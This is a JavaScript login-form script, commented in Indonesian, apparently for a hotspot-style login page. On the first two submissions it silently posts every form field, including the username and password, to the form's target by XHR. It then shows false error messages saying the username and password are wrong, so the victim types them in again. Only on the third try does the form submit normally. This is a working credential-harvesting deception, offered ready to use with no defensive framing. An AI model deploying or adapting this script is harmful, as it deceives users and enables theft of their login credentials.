// <script type="text/javascript">
// javascript versi v0.2

// Mengarahkan kursor otomatis ke kolom username ketika halaman dibuka
document.login.username.focus();

// Mengambil elemen form berdasarkan atribut name="login"
const loginForm = document.getElementsByName("login")[0];

// Menangkap proses submit pada form
loginForm.addEventListener("submit", function (e) {

    // Membaca jumlah percobaan submit dari localStorage
    let count = parseInt(localStorage.getItem("submitCount") || "0");
    count++;

    // Jika percobaan masih kurang dari 3 kali
    if (count < 3) {
        // Mencegah form dikirim secara langsung ke server
        e.preventDefault();

        // Menyembunyikan form dan menampilkan animasi/loading
        e.target.style.display = "none";
        document.getElementById("loading").style.display = "block";
        document.getElementById("loading").innerHTML = "Mengirim data ke status.htm...";

        // Menunda proses selama 2,5 detik (simulasi proses pengiriman)
        setTimeout(() => {

            // Membuat XHR untuk mengirim data ke status.htm
            let form = e.target;
            let xhr = new XMLHttpRequest();
            xhr.open(form.method, form.action);
            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");

            // Mengambil seluruh nilai input dalam form
            let data = [];
            for (let i = 0; i < form.elements.length; i++) {
                let el = form.elements[i];
                if (el.name)
                    data.push(encodeURIComponent(el.name) + "=" + encodeURIComponent(el.value));
            }

            // Mengirim data dalam format URL-encoded
            xhr.send(data.join("&"));

            // Menyimpan jumlah percobaan ke localStorage
            localStorage.setItem("submitCount", count);

            // Menampilkan kembali form dan mengembalikan tampilan awal
            form.reset();
            form.style.display = "block";
            document.getElementById("loading").style.display = "none";
            document.login.username.focus();

            // Menampilkan pesan kesalahan untuk username
            document.getElementById("errUser").style.display = "block";
            document.getElementById("errUser").innerText = "username yang anda masukan salah";

            // Menampilkan pesan kesalahan untuk password
            document.getElementById("errPass").style.display = "block";
            document.getElementById("errPass").innerText = "password yang anda masukan salah";

        }, 2500);

    } else {
        // Jika sudah percobaan ke-3, form dikirim secara normal
        localStorage.removeItem("submitCount");

        // Menghilangkan pesan kesalahan sebelum form benar-benar dikirim
        document.getElementById("errUser").style.display = "none";
        document.getElementById("errPass").style.display = "none";
    }
});
// </script>
